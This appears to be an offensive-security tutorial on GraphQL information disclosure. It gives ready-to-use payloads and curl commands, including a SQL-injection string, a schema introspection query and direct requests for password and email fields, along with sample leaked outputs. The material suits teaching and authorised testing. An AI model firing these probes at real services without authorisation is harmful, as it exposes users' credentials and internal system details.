---
title: Mastering GraphQL Information Disclosure Techniques
description: Explore techniques for exploiting GraphQL vulnerabilities, focusing on
  verbose error messages and schema leaks.
keywords:
- GraphQL injection
- information disclosure
- schema leaks
- error messages
- sensitive data exposure
- debug mode
- access control
- GraphQL security
- stack traces
- internal path exposure
---

# Information Disclosure

## Context

The goal of this article is to explain how attackers can leverage GraphQL injection vulnerabilities to gain unauthorized access to sensitive information. This type of exploitation primarily focuses on verbose error messages, schema leaks, and exposure of sensitive data. Practitioners engaging with this technique should have a working understanding of GraphQL query syntax, the fundamentals of HTTP request and response cycles, web application architectures, and basic methods of exploiting GraphQL injections.

## Theory

### Information Disclosure in GraphQL Context

Information disclosure refers to the unintentional exposure of internal data, debug details, or sensitive business information through GraphQL endpoints. Such exposures often occur due to verbose error handling or security misconfigurations within GraphQL services. Attackers can exploit these weaknesses to unveil stack traces, sensitive schema components, or even database errors, ultimately gaining insights into the back-end systems.

### Common GraphQL Information Disclosure Vectors

Attackers typically use various strategies to extract sensitive information through GraphQL:

1. **Injecting Malformed Queries**
   By sending intentionally malformed requests, attackers can trigger errors that reveal stack traces or database error messages.
   
2. **Schema and Field Discovery**
   Introspection queries can uncover detailed schema structures, exposing sensitive fields that should be hidden from unauthorized access.
   
3. **Requesting Sensitive Fields Directly**
   By asking for sensitive fields like `password` or `email` directly within queries, an attacker can exploit access control weaknesses.
   
4. **Exploiting Debug/Development Mode**
   Development or debug configurations often leave verbose error messages active, further compromising system security by revealing excessive internal details.

### GraphQL Error Handling and Security Misconfigurations

GraphQL's default error handling may inadvertently expose sensitive information such as stack trace details or internal paths. Additionally, when GraphQL services are running in development mode, more verbose errors are displayed. This increased verbosity may lead to significant information exposure if proper error sanitization measures are not enforced.

## Practice

### Triggering Verbose Error Messages via Malformed Queries

- **Payload:**

  ```json
  { user(id: "' OR 1=1 --") { id name } }
  ```

  _Explanation:_ This query injects a malformed value aimed at provoking error-handling in the backend.

- **Command Line:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{\"query\": \"{ user(id: \\\"' OR 1=1 --\\\") { id name } }\"}'
  ```

  _Explanation:_ Sends the crafted query to the GraphQL endpoint to trigger an error response.

- **Expected Output:**

  ```text
  {"errors":[{"message":"SQL syntax error near ...","extensions":{"exception":{"stacktrace":[...],"path":"/app/models/user.js"}}}]}
  ```

  _Explanation:_ Detailed error messages might contain stack traces and internal path information valuable for an attacker.

### Schema and Field Discovery via Introspection

- **Payload:**

  ```json
  { __schema { types { name fields { name type { name } } } } }
  ```

  _Explanation:_ This standard introspection query allows the attacker to enumerate the schema details.

- **Command Line:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{\"query\": \"{ __schema { types { name fields { name type { name } } } } }\"}'
  ```

  _Explanation:_ Sends the introspection query to explore database schema details.

- **Expected Output:**

  ```text
  {"data":{"__schema":{"types":[{"name":"User","fields":[{"name":"password"},{"name":"email"}]},...]}}}
  ```

  _Explanation:_ The response can reveal sensitive fields and schema components.

### Accessing Sensitive Fields via Overly Permissive Queries

- **Payload:**

  ```json
  { user(id: 1) { id name password email } }
  ```

  _Explanation:_ Directly requests sensitive fields to check for any access control issues.

- **Command Line:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{\"query\": \"{ user(id: 1) { id name password email } }\"}'
  ```

  _Explanation:_ Sends a crafted request to access potentially sensitive user data.

- **Expected Output:**

  ```text
  {"data":{"user":{"id":1,"name":"admin","password":"$2y$10$...","email":"admin@example.com"}}}
  ```

  _Explanation:_ Demonstrates exposure of sensitive data due to inadequate access restrictions.

### Identifying Debug/Development Mode Exposure

- **Payload:**

  ```json
  { invalidField }
  ```

  _Explanation:_ The query aims at a nonexistent field to trigger verbose error output.

- **Command Line:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{\"query\": \"{ invalidField }\"}'
  ```

  _Explanation:_ Attempts to provoke errors indicating whether debug or development mode is active.

- **Expected Output:**

  ```text
  {"errors":[{"message":"Cannot query field 'invalidField' on type 'Query'.","extensions":{"exception":{"debugMessage":"Development mode enabled","stacktrace":[...]}}}]}
  ```

  _Explanation:_ Reveals verbose error information characteristic of development mode vulnerabilities.

## Tools

- **curl**
- **Burp Suite**
- **GraphQL Voyager**
- **Postman**

This comprehensive guide outlines the attack vectors associated with GraphQL information disclosure, enabling security professionals to understand and simulate these exploits effectively. Practitioners should proceed with due care only in controlled environments to prevent unauthorized data leakage.